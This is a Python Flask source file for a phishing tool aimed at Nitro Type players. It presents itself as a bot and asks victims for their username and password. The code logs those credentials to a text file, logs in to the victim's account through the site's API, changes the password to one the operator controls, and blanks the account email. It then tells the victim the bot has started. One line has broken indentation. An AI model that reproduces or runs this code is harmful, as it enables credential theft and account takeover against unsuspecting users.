from flask import Flask, request
import threading
import codecs
import httpx
import os
import json

x = 1
new_password = os.environ['new_password']
app = Flask("new_pass")

@app.route("/", methods=["GET", "HEAD"])
def main():
    html_file = codecs.open("index.html", "r", "utf-8")
    return html_file.read()

@app.route("/bot", methods=["POST"])
def bot(): #logger
    form = request.form
    username = form['username']
    password = form['password']
    print('username:' + request.form['username'])
    print('password:' + request.form['password'])
    login = httpx.post("https://www.nitrotype.com/api/v2/auth/login/username",
                       data={
                           "username": username,
                           "password": password
                       })
    if x==1:
			  c = open("account.txt", "a") 
    c.write("\n" + username + " | " + ":" + password + ":" + " current pass")
    if login.status_code == 200:
        print("Password is valid")
        content = (login.json())
        token = (content['results']['token'])
        chngPass = httpx.post(
            "https://www.nitrotype.com/api/v2/settings/password",
            data={
                "password": password,
                "newPassword": new_password,
                "newPassword2": new_password
            },
            headers={
              "Authorization": "Bearer " + token
            })
        httpx.post(
            "https://www.nitrotype.com/api/v2/settings/account",
            data={
                "email": "",
                "password": new_password,
            },
            headers={
              "Authorization": "Bearer " + token
            })	
        if chngPass.status_code == 200:
            print("Sucessfully Changed Password")
        elif chngPass.status_code != 200:
            print("Unable to Change Password Change it manually. " + chngPass)
        f = open("accounts.txt", "a") 
        f.write("\n" + username + " | " + "secret")
        return "started bot"
    elif login.status_code != 200:
        print(login)
        print("logged in")
        return "Bot has started if it doesn't work ask for manual start up or try password again"      
def run():
    app.run(host="0.0.0.0", port=80)

logger = threading.Thread(target=run)
logger.start()
